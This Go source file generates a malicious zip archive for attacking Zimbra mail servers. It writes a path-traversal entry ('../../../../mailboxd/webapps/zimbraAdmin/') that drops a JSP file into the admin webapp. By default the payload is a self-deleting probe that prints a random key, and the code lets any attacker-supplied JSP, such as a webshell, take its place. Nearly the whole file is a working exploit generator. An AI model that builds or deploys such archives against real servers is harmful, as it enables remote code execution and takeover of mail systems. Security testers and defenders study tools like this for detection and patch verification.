// @File    :   main.go
// @Time    :   2022/8/24 14:51:08
// @Author  :   _0xf4n9x_
// @Version :   1.0
// @Contact :   fanq.xu@gmail.com

package main

import (
	"archive/zip"
	"bytes"
	"io/ioutil"
	"math/rand"
	"path"
	"path/filepath"
	"strings"
	"time"
)

func genRandStr(length int) string {
	const charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
	var seededRand *rand.Rand = rand.New(rand.NewSource(time.Now().UnixNano()))
	b := make([]byte, length)
	for i := range b {
		b[i] = charset[seededRand.Intn(len(charset))]
	}
	return string(b)
}

func genEvilZip(file string) (string, string) {
	filename := genRandStr(12) + ".jsp"
	buf := new(bytes.Buffer)
	writer := zip.NewWriter(buf)
	defer writer.Close()
	evilpath := "../../../../mailboxd/webapps/zimbraAdmin/" + filename
	f, _ := writer.Create(evilpath)
	keyStrings := genRandStr(16)
	var content []byte = []byte("<%\nout.println('" + keyStrings + "');\nnew java.io.File(application.getRealPath(request.getServletPath())).delete();\n%>")
	if file != "null" {
		content, _ = ioutil.ReadFile(filepath.Clean(file))
	}
	f.Write(content)
	f, _ = writer.Create(evilpath)
	f.Write(content)
	_ = writer.Close()
	filename = strings.TrimSuffix(filename, path.Ext(filename)) + ".zip"
	ioutil.WriteFile(filename, buf.Bytes(), 0777)
	return filename, keyStrings
}

func main() {

	genEvilZip("null")
}
